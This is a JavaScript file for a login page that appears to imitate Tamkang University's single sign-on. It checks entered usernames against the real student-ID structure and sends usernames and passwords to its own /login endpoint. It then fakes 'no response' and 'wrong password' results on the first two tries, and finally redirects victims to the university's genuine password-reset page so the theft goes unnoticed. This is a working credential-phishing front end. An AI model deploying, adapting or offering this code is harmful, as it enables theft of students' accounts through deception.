document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('eaiForm');

    // 初始化登入次數與異常順序
    if (!sessionStorage.getItem('attemptCount')) {
        sessionStorage.setItem('attemptCount', '0');
        const randomOrder = Math.random() < 0.5 ? ['silent', 'error'] : ['error', 'silent'];
        sessionStorage.setItem('errorOrder', JSON.stringify(randomOrder));
    }

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();

        // 基本格式檢查
        if (!/^\d{9}$/.test(username)) {
            alert('帳號或密碼錯誤');
            return;
        }

        // 學制：第一位必須在 ['2','4','6','7','8'] 中
        const validDegreeTypes = ['2', '4', '6', '7', '8'];
        if (!validDegreeTypes.includes(username[0])) {
            alert('帳號或密碼錯誤');
            return;
        }

        // 年次：第二、三位要是 00 至 13 之間的數字
        const yearNum = parseInt(username.substring(1, 3), 10);
        if (isNaN(yearNum) || yearNum < 0 || yearNum > 13) {
            alert('帳號或密碼錯誤');
            return;
        }

        // 系所：第四、五位必須是系所編號清單中其中一個
        const deptCode = username.substring(3, 5);
        const validDeptCodes = ['00','01','03','04','05','08','09','10','11','12','13',
        '16','17','19','20','21','22','23','33','35','36','37','38','40','41','43',
        '44','48','49','50','51','53','54','55','56','57','59','60','61','62','63',
        '64','65','66','68','71','73','77','80','81','82','84','85','86'];
        if (!validDeptCodes.includes(deptCode)) {
            alert('帳號或密碼錯誤');
            return;
        }

        // 學生身分別：第六位必須是 ['0','1','2','3','4','5','6','8']
        const validIdentity = ['0', '1', '2', '3', '4', '5', '6', '8'];
        if (!validIdentity.includes(username[5])) {
            alert('帳號或密碼錯誤');
            return;
        }

        // 第七到九位：確保是數字（前面整體驗證已確保）
        // 這裡不需要額外驗證，因為整體用 /^\d{9}$/ 已驗證

        if (password.length < 6) {
            alert('密碼至少要6碼');
            return;
        }

        let attempt = parseInt(sessionStorage.getItem('attemptCount'), 10);
        const order = JSON.parse(sessionStorage.getItem('errorOrder'));
        attempt++;

        // 更新嘗試次數
        sessionStorage.setItem('attemptCount', attempt.toString());

        fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password, attempt })
        })
        .then(res => res.json())
        .then(data => {
            if (attempt <= 2) {
                // 前兩次根據order決定行為
                const behavior = order[attempt - 1];
                if (behavior === 'silent') {
                    // 模擬無反應，前端不顯示任何訊息
                    console.log('模擬無反應，忽略後端回應');
                    return;
                } else if (behavior === 'error') {
                    alert('帳號或密碼錯誤');
                    return;
                }
            }

            // 第三次及以後正常處理
            if (data.success) {
                alert('登入次數已達上限，將幫您跳轉到忘記密碼頁面');
                window.location.href = 'https://sso.tku.edu.tw/j_self/pswdself/goAction.do?ln=zh_TW';
            } else {
                alert(data.message);
            }
        })
        .catch(err => {
            console.error('錯誤：', err);
            alert('系統錯誤，請稍後再試');
        });
    });
});
